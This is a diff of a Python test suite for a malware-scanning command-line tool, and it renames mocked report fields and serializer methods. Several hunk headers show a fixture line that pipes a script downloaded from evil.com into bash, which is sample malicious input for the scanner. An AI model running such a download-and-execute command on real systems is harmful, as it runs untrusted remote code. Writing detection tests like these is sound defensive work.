@@ -48,8 +48,8 @@ class TestBasicCLI:
                     malicious=False,
                     confidence=1.0,
                     activities=[],
-                    input=str(test_file),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(test_file),
+                    start_time="2024-01-01T12:00:00",
                     duration=0.5,
                     all_file_types=[".py"],
                 )
@@ -111,8 +111,8 @@ os.system('curl evil.com/malware.sh | bash')
                     malicious=True,
                     confidence=0.95,
                     activities=["SUBPROCESS_EXECUTION", "FILESYSTEM_ACCESS"],
-                    input=str(test_file),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(test_file),
+                    start_time="2024-01-01T12:00:00",
                     duration=0.8,
                     all_file_types=[".py"],
                 )
@@ -159,19 +159,19 @@ os.system('curl evil.com/malware.sh | bash')
                         malicious=False,
                         confidence=1.0,
                         activities=[],
-                        input=str(test_file),
-                        start="2024-01-01T12:00:00",
+                        input_path=str(test_file),
+                        start_time="2024-01-01T12:00:00",
                         duration=0.3,
                         all_file_types=[".py"],
                     )
 
                     # Mock the specific format method
                     if fmt == "json":
-                        mock_report.to_report_json = lambda: '{"result": "good"}'
+                        mock_report.to_json = lambda: '{"result": "good"}'
                     elif fmt == "yaml":
-                        mock_report.to_report_yaml = lambda: "result: good"
+                        mock_report.to_yaml = lambda: "result: good"
                     elif fmt == "markdown":
-                        mock_report.to_report_markdown = lambda: "# Good Result"
+                        mock_report.to_markdown = lambda: "# Good Result"
                     else:  # demo
                         mock_report.to_demo_text = lambda: "🟢 good"
 
@@ -224,12 +224,12 @@ os.system('curl evil.com/malware.sh | bash')
                     malicious=False,
                     confidence=1.0,
                     activities=[],
-                    input=str(test_file),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(test_file),
+                    start_time="2024-01-01T12:00:00",
                     duration=0.4,
                     all_file_types=[".py"],
                 )
-                mock_report.to_report_json = lambda: '{"test": "saved"}'
+                mock_report.to_json = lambda: '{"test": "saved"}'
                 mock_process.return_value = mock_report
 
                 with patch.object(
@@ -298,8 +298,8 @@ os.system('curl evil.com/malware.sh | bash')
                     malicious=False,
                     confidence=1.0,
                     activities=[],
-                    input=str(tmp_path),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(tmp_path),
+                    start_time="2024-01-01T12:00:00",
                     duration=1.2,
                     all_file_types=[".py", ".txt"],
                 )
@@ -354,8 +354,8 @@ os.system('curl evil.com/malware.sh | bash')
                     malicious=False,
                     confidence=1.0,
                     activities=[],
-                    input=str(test_file),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(test_file),
+                    start_time="2024-01-01T12:00:00",
                     duration=0.6,
                     all_file_types=[".py"],
                 )
@@ -404,8 +404,8 @@ os.system('curl evil.com/malware.sh | bash')
                     malicious=False,
                     confidence=1.0,
                     activities=[],
-                    input=str(tmp_path),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(tmp_path),
+                    start_time="2024-01-01T12:00:00",
                     duration=0.2,
                     all_file_types=[".py"],
                 )
@@ -467,8 +467,8 @@ os.system('curl evil.com/malware.sh | bash')
                     malicious=False,
                     confidence=1.0,
                     activities=[],
-                    input=str(test_file),
-                    start="2024-01-01T12:00:00",
+                    input_path=str(test_file),
+                    start_time="2024-01-01T12:00:00",
                     duration=0.3,
                     all_file_types=[".py"],
                 )
